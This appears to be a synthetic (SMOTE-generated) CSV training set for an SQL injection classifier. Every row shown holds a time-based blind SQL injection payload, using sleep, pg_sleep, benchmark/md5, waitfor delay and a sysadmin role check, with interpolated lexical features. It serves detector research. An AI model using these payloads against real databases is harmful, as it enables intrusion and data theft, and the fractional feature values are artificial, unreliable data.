id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000157,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,1.0832453601560386,91.75439592428776,26.78697026408222,3.64001446320838,23.590227698061664,24.37719796214389,35.19674256602055,8.590227698061664,0.2572465538201014,0.26488704182089967,0.3846521469429211,0.09321425741607789,0.19674256602055507,0.0,0.39348513204111024,0.0,0.0,1.1967425660205548,0.0,5.803257433979445,1.3877787807814457e-17,0.0,1.0,1.5902276980616654,0.19674256602055507,0.0,0.19674256602055512,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.8032574339794449,0.0,0.19674256602055512,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000158,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,1.1573024172996822,43.40199481266919,23.800664937556398,4.033617935322232,16.0,2.0,11.601329875112794,13.800664937556398,0.3689401790450626,0.046117522380632825,0.26698147270118217,0.31796082587312235,2.0,0.8006649375563972,2.0,0.0,0.0,0.0,0.8006649375563973,2.0,1.3877787807814457e-17,4.0,0.19933506244360277,2.0,1.0,0.8006649375563972,1.0,0.0,0.0,0.0,1.0,0.8006649375563973,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000159,attack,time,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000052,1.4364588933659608,101.18339885383261,28.703626037123158,3.6727914981744334,25.9253822598621,24.33263433410842,40.22175622273894,10.703626037123158,0.25564336777318014,0.2386680543605913,0.3991554379297207,0.10653313993650786,1.1102230246251565e-16,1.0,0.0,0.0,0.0,2.0,0.0,5.703626037123158,1.3877787807814457e-17,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.7036260371231572,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2963739628768428,0.7036260371231572,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000160,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,0.35363332469389297,88.08525840189951,26.914741598100488,3.8204937194405284,21.170516803799025,28.488449588602926,30.426292009497566,8.0,0.24032367879142297,0.3234820058914672,0.3453723116418284,0.0908220036752814,1.1102230246251565e-16,0.0,0.0,0.0,0.0,1.9147415981004872,0.0,4.170516803799026,1.3877787807814457e-17,0.0,1.0,1.9147415981004872,0.0,0.0,0.0,0.9147415981004872,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.08525840189951284,0.0,0.9147415981004872,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000161,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.6707639644681808,33.81694189084703,15.454235472711758,3.2977715548246067,12.454235472711758,0.0,11.635588681779396,9.72711773635588,0.3697740401156864,1.3877787807814457e-17,0.34053665472524486,0.28968930515906877,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,2.727117736355879,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7271177363558793,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7271177363558794
SMOTE_000162,attack,time,"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000061,1.475857687286354,120.90499615517612,35.30727412539051,4.1578882101575205,41.07817762382848,25.709552095604906,39.5977220297856,14.51954440595712,0.33891456284316235,0.21481524310774897,0.3263506182160938,0.11991957583299495,3.0,0.0,0.0,0.0,0.1731814686523734,1.8268185313476266,0.0,5.692725874609494,1.3877787807814457e-17,0.0,0.8268185313476264,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.8268185313476265,1.0,1.346362937304747,0.0,1.0,1.1731814686523736,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.17318146865237347,0.8268185313476266,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.51954440595712
SMOTE_000163,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,0.34673676926625946,107.27758177403248,29.72241822596751,3.4182737910369236,35.46263629005415,9.629890967956678,49.09252725801083,13.092527258010831,0.33039341005249,0.08995306557199897,0.4576378223206986,0.12201570205481237,0.9537363709945849,0.1850545160216609,0.0,0.0,1.0,0.9537363709945847,0.0,9.046263629005416,1.3877787807814457e-17,0.0,0.0,1.9537363709945845,0.9537363709945845,0.046263629005415224,0.0,0.9537363709945847,0.0,0.9537363709945847,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.9537363709945849,1.0,0.04626362900541542,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000164,attack,time,"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000061,1.4368345781363636,120.85462620857888,35.32559046960768,4.160171588308354,41.023228591176945,25.796554730636508,39.52903573897118,14.505807147794236,0.33861886103526057,0.21557891744647428,0.32594273323982886,0.11985948827843633,3.0,0.0,0.0,0.0,0.16860238259807864,1.8313976174019215,0.0,5.674409530392315,1.3877787807814457e-17,0.0,0.8313976174019212,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.8313976174019213,1.0,1.3372047651961574,0.0,1.0,1.1686023825980787,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1686023825980787,0.8313976174019213,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.505807147794236
SMOTE_000165,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.534605739738911,28.16936052853015,18.40323263423618,4.012860213000177,13.70161631711809,3.532255788587941,2.7661278942939695,8.169360528530149,0.4858124464019635,0.12811743539091874,0.0997423281948458,0.28632779001227193,2.76612789429397,0.23387210570602981,2.0,0.0,0.0,0.0,0.2338721057060298,0.0,1.3877787807814457e-17,0.9354884228241189,0.0,2.0,1.0,0.23387210570602981,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.2338721057060298,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000166,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,2.091958044097335,57.380163172998984,18.490781782538384,2.9698878871694983,10.0,10.0,28.907817825383837,8.47234534761515,0.17653136282782173,0.17653136282782173,0.5003599243083946,0.14657735003596195,0.49078178253838356,0.5092182174616164,0.0,0.0,0.0,1.0,0.0,4.981563565076767,1.3877787807814457e-17,0.0,1.0,0.9999999999999999,0.49078178253838356,0.5092182174616164,0.0,0.49078178253838345,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000167,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.25678529865551497,43.63410000474963,17.0,3.123797217966756,13.0,0.0,18.829228575499684,11.804871429249946,0.29927292394049987,1.3877787807814457e-17,0.42961010865642874,0.2711169674030714,1.1102230246251565e-16,1.0,2.0,0.0,0.0,0.0,0.0,3.804871429249947,1.3877787807814457e-17,5.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000168,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,0.5286846044043123,112.57675901893886,24.42324098106114,3.2733734318202172,44.2945983648981,2.564321308081521,50.858919672979624,14.85891967297962,0.39321275819876245,0.023043155220853054,0.4517941620280221,0.13194992455236243,0.07054016351019021,3.7178393459592396,0.0,0.0,1.0,0.0705401635101901,0.0,9.929459836489809,1.3877787807814457e-17,0.0,0.0,1.07054016351019,0.0705401635101901,0.9294598364898099,0.0,0.0705401635101901,0.0,0.0705401635101901,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.07054016351019013,1.0,0.9294598364898099,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000169,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.08094654044897333,44.52239482061542,16.946932757846156,3.085412726748165,13.0,0.9469327578461568,19.6285293049231,10.946932757846158,0.2927215230444442,0.021042950174359046,0.4400221742649575,0.24621335251623921,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,3.946932757846157,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000170,attack,time,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000078,1.3677698477345845,99.52213632060129,29.00632466302894,3.8132916916691855,25.254743497271704,28.261068160300646,35.75158116575724,10.254743497271706,0.25391764327297395,0.2831052613606335,0.36038136277204635,0.10259573259434618,0.7515811657572353,0.0,1.5031623315144702,0.0,0.0,1.7515811657572353,0.0,5.248418834242765,1.3877787807814457e-17,0.0,1.0,3.254743497271706,0.7515811657572351,0.0,0.7515811657572351,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.24841883424276484,0.0,0.7515811657572352,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000171,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.2656480164111129,33.75695123937097,16.747682920209677,3.4498299555269614,13.0,0.7476829202096757,10.756951239370972,9.252317079790323,0.3856562574816308,0.022657058188172013,0.3176850829171148,0.27400160141308244,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,2.2523170797903234,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000172,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.500593826866967,64.43282448970818,26.35763359496633,4.194261464045281,32.5034351647643,3.5717557299775526,15.143511459955104,13.214122135011223,0.4932551803293176,0.0546401308894792,0.23802617219530078,0.21407851658590238,3.571755729977552,0.2141221350112238,2.0,0.0,0.0,0.0,0.21412213501122385,2.0,1.3877787807814457e-17,1.6423664050336717,0.7858778649887762,2.7858778649887763,1.0,0.21412213501122374,1.0,0.0,0.0,0.0,1.0,0.21412213501122385,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000173,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,0.8521510580195517,78.66287190663802,24.831435953319012,3.422702773451753,17.039294941648762,18.0,34.41571797665951,9.207858988329752,0.21595412681447618,0.22919301843858148,0.43781094566494866,0.1170419090819937,1.1102230246251565e-16,0.20785898832975266,0.0,0.0,0.0,2.0,0.0,5.0,1.3877787807814457e-17,0.0,1.0,2.0,0.0,0.2078589883297527,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7921410116702473,0.2078589883297527,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000174,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.019570077856917948,37.07517133340126,16.006536637687066,3.0078910263767913,11.055561420340059,0.00326831884353318,17.019609913061196,8.996731681156467,0.2978508503987245,5.447198072557058e-05,0.4592106550069563,0.24288402261359368,1.0065366376870657,0.0,0.0,0.0,0.0,0.9967316811564669,0.0,3.003268318843533,1.3877787807814457e-17,3.9901950434694013,0.0,0.9967316811564669,1.0,0.0,0.0,0.0,0.0,0.9967316811564672,1.0,0.0,0.0,0.0,0.0,0.0032683188435330135,0.0,0.0,0.0,0.0032683188435330968,0.996731681156467,0.0,0.0,0.0,0.0,0.0,0.0,0.996731681156467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000175,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,1.0378156486082881,105.33721000861374,30.337210008613752,3.644563551557563,30.337210008613752,18.0,45.0,12.0,0.2879865903545401,0.17088321831491038,0.42720804578727595,0.11392214554327358,1.1102230246251565e-16,1.0,2.0,0.0,0.0,2.0,0.0,6.0,1.3877787807814457e-17,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.3372100086137501,0.6627899913862498,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000176,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.2685450233233504,35.684010265352896,19.31969941447508,3.757644340224911,13.955388563597268,1.182155425438908,9.182155425438907,11.364310850877814,0.39131251468801537,0.028833059157046523,0.2610002350082458,0.3188541911466923,1.1821554254389075,0.0,2.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,4.4089222872805465,0.5910777127194538,2.0,0.5910777127194538,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5910777127194538,0.5910777127194538,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1821554254389075
SMOTE_000177,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.22623844045369762,25.127976755167452,13.19905472150014,3.1497919233418568,9.13270314766676,0.06635157383337997,8.796218886000556,7.13270314766676,0.36791980157265763,0.0016183310691068459,0.3435827634376766,0.286879103920559,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,2.1327031476667595,1.3877787807814457e-17,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.06635157383337986,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0663515738333798
SMOTE_000178,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.07182707549452497,44.57299274750868,16.85766424916956,3.0738232254353446,13.0,0.8576642491695603,19.71532849833912,11.0,0.29182597581078684,0.019059205537101345,0.4421851468122152,0.24692967183989656,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,4.0,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000179,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,2.108235638010017,122.87159839414923,30.62030936660953,3.7140643199536107,45.021340588641294,11.839587511187295,49.01067029432065,17.0,0.36016493849430903,0.10104354254179145,0.3986063730975854,0.14018514586631414,3.2299484388984117,0.0,0.0,0.0,0.7700515611015882,1.2299484388984117,0.0,8.310154683304765,1.3877787807814457e-17,0.0,0.22994843889841177,4.459896877796824,1.0,0.0,0.0,0.7700515611015881,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.5401031222031767,0.0,1.0,1.5401031222031765,0.7700515611015882,0.22994843889841177,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.080206244406353
SMOTE_000180,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,0.10627762924854521,63.19900663743443,25.97157048036651,3.866906824491005,21.91471144109953,10.11371807853396,21.184791877617684,9.985785240183255,0.34719618115145595,0.15979677851438778,0.3348717272528945,0.15813531308126175,2.9573557205497645,0.0,0.0,0.0,0.0,1.014214759816745,0.0,3.02842951963349,1.3877787807814457e-17,0.0,0.014214759816745026,2.9857852401832545,0.985785240183255,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9857852401832549,0.985785240183255,0.0,1.0,0.0,0.014214759816745026,0.985785240183255,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9857852401832554
SMOTE_000181,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.0383619274165564,36.19449195994053,16.0,3.2819338663685196,13.0,0.0,13.162076633283775,10.032415326656755,0.35943889187881817,1.3877787807814457e-17,0.36329785933795566,0.27726324878322617,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,3.0324153266567553,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000182,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,0.8375939853393763,53.44283373435886,20.68856674687177,3.252456191117475,13.0,10.311433253128229,22.75426698748709,7.377133493743544,0.24372478598303082,0.193709269664896,0.4250387907953372,0.137527153556736,1.1102230246251565e-16,0.6885667468717723,0.0,0.0,0.0,0.0,0.0,4.688566746871772,1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.6885667468717722,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000183,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.09987092807573528,38.48121580476631,16.0,3.018960763268585,11.0,0.0,17.58497264381305,9.896243160953262,0.2863549216799175,1.3877787807814457e-17,0.456374093984099,0.2572709843359835,1.1102230246251565e-16,2.0,0.0,0.0,0.0,1.0,0.0,2.896243160953262,1.3877787807814457e-17,4.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000184,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.6967036658752171,30.253350445205804,16.0,3.317307939833271,11.0,0.2506700890411606,11.002680356164639,8.0,0.365327733369915,0.007372649677681184,0.361606719956102,0.26569289699630183,1.1102230246251565e-16,0.7493299109588398,0.0,0.0,0.0,0.0,0.0,2.25067008904116,1.3877787807814457e-17,4.0,0.0,0.0,0.0,0.7493299109588396,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000185,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,2.5673690041654287,85.3530662504346,27.423537750028974,3.4702021282761124,24.23537750028973,10.0,38.694151000115895,12.423537750028974,0.28111143246891956,0.11802711250951442,0.45472319926515964,0.14613825575640638,1.1102230246251565e-16,2.2706132500869187,1.152924499942054,0.0,0.0,1.4235377500289728,0.0,6.0,0.5764622499710271,1.0,0.0,2.5764622499710272,0.0,1.0,0.576462249971027,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.42353775002897276,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4235377500289728
SMOTE_000186,attack,time,"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000056,0.9901403448969137,100.71198091275282,29.413594273825847,3.56811115936091,28.884792365101127,16.589861576734087,43.58986157673408,11.647465394183522,0.28496978431049924,0.16307220341413384,0.4355121879418987,0.11644582433346816,1.1102230246251565e-16,0.8237326970917608,2.0,0.0,0.0,1.8237326970917604,0.0,6.0,1.3877787807814457e-17,1.0,0.0,3.823732697091761,0.0,0.8237326970917607,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8237326970917607,1.0,0.8237326970917607,0.17626730290823933,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.823732697091761
